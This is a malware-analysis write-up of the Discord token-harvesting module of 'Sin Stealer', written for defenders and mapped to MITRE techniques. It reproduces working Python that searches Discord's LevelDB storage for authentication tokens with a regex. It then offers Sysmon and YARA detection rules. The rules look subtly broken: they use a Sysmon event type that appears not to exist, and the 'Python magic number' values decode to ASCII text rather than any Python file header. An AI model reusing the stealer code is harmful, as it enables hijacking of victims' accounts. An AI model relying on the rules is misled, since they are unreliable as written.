# Sin Stealer - Discord Token Extraction from LevelDB

**Repository:** `MalwareSourceCode-main`  
**File:** `Python/Trojan.Python.Sin/Sin/plugins/discord.py`  
**Language:** Python  
**MITRE ATT&CK:** T1528 (Steal Application Access Token), T1555.003 (Credentials from Password Stores)

## Overview

Sin Stealer implements a highly effective Discord authentication token theft module. It operates by directly parsing the LevelDB database files that the Discord desktop application uses for its local storage. Unlike browser credentials, which are typically encrypted, Discord tokens are stored in plaintext within these database files. This makes them trivial to extract with simple string searching or regular expressions. A stolen token grants an attacker complete access to the victim's Discord account, including private messages, servers, and any linked payment information.

## Code Snippet & Analysis

The stealer targets multiple Discord client versions and also checks the Chrome browser's storage, as the Discord web app might leave tokens there.

```python
import os
import re

class Discord():
	def __init__(self):
		self.tokens = []
		# 1. Define regex for standard and MFA-protected Discord tokens
		self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
		self.discord() # Scan Discord app directories
		self.chrome()  # Scan Chrome directory

	def discord(self):
		# 2. Define paths for all major Discord client versions
		discord_paths = [
            os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
		    os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
		    os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb'
        ]

		for location in discord_paths:
			try:
                # 3. Iterate through all files in the leveldb directory
				for file in os.listdir(location):
					with open(f"{location}\\{file}", errors='ignore') as data:
                        # 4. Apply the regex to the file content
						found_tokens = re.findall(self.regex, data.read())
						if found_tokens:
							for token in found_tokens:
								self.tokens.append(token)
			except:
				pass
    # ... (chrome function is similar) ...
```

### What it does:

1.  **Defines Token Regex:** The core of the stealer is a regular expression designed to match two formats of Discord tokens: the standard three-part token and the longer token prefixed with `mfa.` for accounts with multi-factor authentication enabled.
2.  **Enumerates Target Paths:** It creates a list of paths corresponding to the `leveldb` storage for the stable, canary, and public test build (PTB) versions of the Discord desktop client. This ensures it finds tokens regardless of which version the user has installed.
3.  **Iterates Through LevelDB Files:** For each path, it iterates through all files in the `leveldb` directory. While `.ldb` and `.log` files are the primary targets, it scans all files to be thorough.
4.  **Extracts Tokens:** It reads the entire content of each file and applies the regex to find any matching token strings. The `errors='ignore'` flag prevents crashes from binary data. All discovered tokens are appended to a list for exfiltration.

### Why it's a TTP:

This is a direct implementation of **T1528 - Steal Application Access Token**. The malware is specifically targeting a non-standard credential (an application-specific token) that grants access outside of the typical username/password paradigm. Because the Discord client, built on Electron, stores these valuable tokens in plaintext, this form of credential theft is highly effective and requires no complex decryption logic. The stealer simply needs to know where to look (`%APPDATA%\Discord\Local Storage\leveldb`) and what to look for (the token's regex pattern).

## Detection & Evasion

### Sysmon Rule

A Sysmon rule can be created to detect when a process that is not Discord itself reads files from the `leveldb` directory. This is a strong indicator of token theft.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Discord Token Theft" groupRelation="or">
            <FileAccess onmatch="include">
                <!-- Detects access to Discord's LevelDB storage files -->
                <TargetFilename condition="contains">\Discord\Local Storage\leveldb\</TargetFilename>
                <TargetFilename condition="end with any">.ldb;.log</TargetFilename>
                <!-- Exclude legitimate access by Discord's own processes -->
                <Image condition="not end with">\Discord.exe</Image>
                <Image condition="not end with">\Update.exe</Image>
            </FileAccess>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule targets the default Discord installation path. For full coverage, add similar conditions for `discordcanary` and `discordptb`.

### Yara Rule

A Yara rule can reliably identify Python-based Discord stealers by searching for the combination of the Discord paths and the token regex pattern.

```yara
rule TTP_SinStealer_Discord_Harvest
{
    meta:
        author = "GitHub Copilot"
        description = "Detects Python-based stealers targeting Discord tokens, like Sin Stealer."
        mitre_ttp = "T1528"
        malware = "Sin Stealer"
    strings:
        // Discord paths
        $s1 = "Discord\\\\Local Storage\\\\leveldb" ascii
        $s2 = "discordcanary\\\\Local Storage\\\\leveldb" ascii
        $s3 = "discordptb\\\\Local Storage\\\\leveldb" ascii

        // Discord Token Regex
        $re1 = /[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/

    condition:
        // Requires Python magic number, at least one path, and the regex
        (uint32(0) == 0x61797243 or uint32(0) == 0x65766f4d) and
        (1 of ($s*)) and
        $re1
}
```
**Note:** This rule is highly specific. It looks for the Python magic number, at least one of the hardcoded Discord paths, and the exact regular expression used to find the tokens.
